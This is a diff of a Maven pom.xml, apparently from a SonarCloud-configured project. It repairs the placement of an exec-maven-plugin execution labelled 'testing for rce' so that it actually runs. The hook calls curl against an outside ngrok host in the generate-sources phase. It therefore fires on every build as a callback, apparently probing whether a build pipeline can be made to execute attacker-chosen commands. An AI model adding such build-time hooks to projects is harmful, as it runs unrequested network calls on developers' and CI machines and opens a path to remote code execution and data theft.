@@ -25,23 +25,27 @@
         <sonar.organization>seba-c53</sonar.organization>
         <sonar.host.url>https://sonarcloud.io</sonar.host.url>
     </properties>
-    <plugin>
-        <artifactId>exec-maven-plugin</artifactId>
-        <groupId>org.codehaus.mojo</groupId>
-        <executions>
-            <execution>
-                <id>testing for rce</id>
-                <phase>generate-sources</phase>
-                <goals>
-                    <goal>exec</goal>
-                </goals>
-                <configuration>
-                    <executable>curl</executable>
-                    <arguments>
-                        <argument>seba.ngrok.io</argument>
-                    </arguments>
-                </configuration>
-            </execution>
-        </executions>
-    </plugin>
+    <build>
+        <plugins>
+            <plugin>
+                <artifactId>exec-maven-plugin</artifactId>
+                <groupId>org.codehaus.mojo</groupId>
+                <executions>
+                    <execution>
+                        <id>testing for rce</id>
+                        <phase>generate-sources</phase>
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                        <configuration>
+                            <executable>curl</executable>
+                            <arguments>
+                                <argument>seba.ngrok.io</argument>
+                            </arguments>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+        </plugins>
+    </build>
 </project>
